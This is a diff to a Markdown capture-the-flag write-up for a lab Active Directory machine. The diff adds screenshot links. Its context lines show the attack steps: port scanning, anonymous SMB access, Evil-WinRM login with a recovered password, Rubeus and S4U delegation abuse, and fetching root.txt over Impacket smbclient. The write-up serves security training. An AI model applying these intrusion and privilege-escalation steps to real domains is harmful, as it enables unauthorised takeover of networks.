@@ -69,6 +69,8 @@
 nmap -A -sC -sV 10.129.68.128
 ```
 
+![Nmap scan output](./images/01-nmap-scan.jpeg)
+
 ### Open ports
 
 | Port | Service | Notes |
@@ -97,6 +99,8 @@ An anonymous (null/guest) SMB session was allowed against a non-default share na
 smbclient //10.129.68.128/support-tools -U ""
 ```
 
+![Anonymous listing of the support-tools share](./images/02-smbclient-anonymous-listing.jpeg)
+
 | Command | Purpose |
 |---|---|
 | `smbclient //<ip>/<share> -U ""` | Connects using a blank/anonymous username to find misconfigured guest access |
@@ -107,6 +111,9 @@ smbclient //10.129.68.128/support-tools -U ""
 get UserInfo.exe.zip
 unzip UserInfo.exe.zip
 ```
+
+![Extracting UserInfo.exe.zip](./images/03-unzip-userinfo.png)
+
 UserInfo.exe is a .NET tool built to query Active Directory over LDAP.
 
 ### 3. Decompiling UserInfo.exe to recover the hardcoded LDAP password
@@ -154,11 +161,16 @@ The `info` attribute is a free-text notes field in AD that's sometimes (mis)used
 evil-winrm -i 10.129.68.128 -u 'support' -p '<recovered_password>'
 ```
 
+![LDAP bind and Evil-WinRM foothold shell](./images/04-ldap-bind-and-evilwinrm-foothold.jpeg)
+
 ### 6. Domain enumeration from the foothold shell
 ```powershell
 Get-ADDomain
 whoami /groups
 ```
+
+![Domain enumeration output](./images/05-domain-enumeration.jpeg)
+
 `whoami /groups` showed `support` is a member of **Shared Support Accounts** and **BUILTIN\Remote Management Users**.
 
 ---
@@ -193,6 +205,9 @@ This single command is the actual privilege escalation — it writes to the DC c
 ```powershell
 .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
 ```
+
+![RBCD setup — machine account and delegation configuration](./images/06-rbcd-setup.jpeg)
+
 This RC4/NTLM hash feeds the S4U request that follows.
 
 ### Credentials & Accounts Used
@@ -234,6 +249,8 @@ Blank password doesn't fall back to ticket-based auth.
 | `/msdsspn:cifs/dc.support.htb` | Target SPN for the S4U2proxy exchange |
 | `/domain:support.htb` | Target Kerberos realm |
 | `/ptt` | Pass-the-Ticket — fails on-target |
+
+![S4U ticket request attempt](./images/07-s4u-ticket-request.jpeg)
 
 **Result:** TGT, S4U2self, and S4U2proxy all completed successfully at the KDC, but the final local injection failed:
 ```
@@ -298,6 +315,8 @@ cd Users\Administrator\Desktop
 ls
 get root.txt
 ```
+
+![Impacket smbclient session retrieving root.txt](./images/08-impacket-root-access.jpeg)
 
 ---
 
